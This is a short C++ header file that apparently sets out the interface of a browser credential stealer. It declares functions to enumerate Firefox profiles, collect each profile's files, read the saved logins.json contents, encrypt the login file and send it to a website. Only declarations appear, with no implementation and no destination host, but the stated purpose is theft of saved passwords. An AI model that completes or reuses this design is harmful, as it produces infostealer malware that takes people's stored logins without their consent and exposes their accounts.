#include "Includes.h"
#pragma once

struct Profile {
	std::wstring profileName = { L"" };
	std::wstring profilePath = { L"" };
	std::vector<std::wstring> ProfileDirectories;
	std::vector<std::wstring> ProfileFiles;
	std::string LoginsFileContent;
};

struct Browsers {
	
	std::vector<Profile> FirefoxProfileList;

	/*
	
	GET ALL THE PROFILES
	
	*/
	std::vector<Profile> GetFirefoxProfilesList(const std::wstring& p_firefox);

	/*
	
	GET ALL FILES IN THE PROFILE

	*/
	Profile GetProfileContent(Profile profileName);

	/*
	
	PARSE LOGINS.JSON CONTENT
	
	*/

	std::string GetProfileLoginsContent(Profile& profileName);

	/*

	ENCRYPT PROFILE JSON LOGIN FILE

	*/
	
	void EncryptFirefoxProfile();
	
	/*
	
	SEND PROFILE JSON FILE TO WEBSITE
	
	*/
	
	int sendFirefoxProfile();

};